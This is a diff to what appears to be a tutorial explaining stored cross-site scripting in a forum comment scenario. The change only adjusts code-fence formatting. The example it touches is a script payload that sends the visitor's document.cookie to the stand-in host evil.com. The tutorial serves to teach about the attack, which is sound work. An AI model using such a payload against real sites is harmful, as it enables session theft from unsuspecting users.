@@ -61,11 +61,13 @@ Scenario
 - the forum page on the trusted site displays all comments which have been added.
 - whatever the users write the exact same comment without modifications is shown.
 - Now attacker came to trusted site and he entered comment as below and hit submit button
-   ```javascript
+
+```javascript
 <script> 
 window.location="http://www.evil.com/?cookie="+document.cookie;
 </script>
-``` 
+```
+
 - Now, this input is written directly to the websites comment database(user input has not cleaned in anyway (UNVALIDATED & UNSANITIZED USER INPUT).
 - Now our victim visits the comments page of the trusted site
 - Boom !!  so what just happened? = victims session ID has gone to evil.com
